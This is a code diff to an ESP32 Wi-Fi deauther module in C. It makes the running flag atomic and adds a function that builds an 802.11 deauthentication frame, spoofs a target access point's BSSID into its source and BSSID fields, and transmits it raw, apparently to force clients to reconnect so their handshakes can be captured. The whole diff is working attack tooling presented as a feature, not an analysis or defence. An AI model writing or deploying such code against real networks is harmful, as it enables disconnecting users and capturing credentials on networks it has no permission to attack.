@@ -15,6 +15,7 @@
 
 #include "wifi_deauther.h"
 
+#include <stdatomic.h>
 #include <string.h>
 
 #include "esp_heap_caps.h"
@@ -33,6 +34,8 @@ static const char *TAG = "WIFI_DEAUTHER";
 #define DEAUTHER_DELAY_MS       100
 #define DEAUTHER_STOP_MARGIN_MS 50
 #define DEAUTH_FRAME_LEN        26
+#define DEAUTH_SOURCE_OFFSET    10
+#define DEAUTH_BSSID_OFFSET     16
 #define BSSID_LEN               6
 #define MAC_LEN                 6
 
@@ -51,7 +54,7 @@ static const uint8_t DEAUTH_FRAME_CLASS3[] = {0xc0, 0x00, 0x3a, 0x01, 0xff, 0xff
 static TaskHandle_t s_deauth_task_handle = NULL;
 static StackType_t *s_deauth_task_stack = NULL;
 static StaticTask_t *s_deauth_task_tcb = NULL;
-static bool s_is_running = false;
+static atomic_bool s_is_running = false;
 
 static wifi_ap_record_t s_target_ap;
 static wifi_deauther_frame_type_t s_type;
@@ -61,6 +64,23 @@ static uint8_t s_target_client[MAC_LEN];
 
 static const uint8_t *get_deauth_frame_template(wifi_deauther_frame_type_t type);
 static void deauth_task(void *pvParameters);
+
+esp_err_t wifi_deauther_send_capture_frame(const uint8_t *bssid, uint8_t channel) {
+  if (bssid == NULL || channel == 0)
+    return ESP_ERR_INVALID_ARG;
+  uint8_t current_channel = 0;
+  wifi_second_chan_t secondary;
+  esp_err_t err = esp_wifi_get_channel(&current_channel, &secondary);
+  if (err != ESP_OK)
+    return err;
+  if (current_channel != channel || s_is_running)
+    return ESP_ERR_INVALID_STATE;
+  uint8_t frame[DEAUTH_FRAME_LEN];
+  memcpy(frame, DEAUTH_FRAME_INACTIVITY, sizeof(frame));
+  memcpy(frame + DEAUTH_SOURCE_OFFSET, bssid, BSSID_LEN);
+  memcpy(frame + DEAUTH_BSSID_OFFSET, bssid, BSSID_LEN);
+  return esp_wifi_80211_tx(WIFI_IF_AP, frame, sizeof(frame), false);
+}
 
 void wifi_deauther_send_raw_frame(const uint8_t *frame_buffer, int size) {
   esp_err_t ret = esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false);
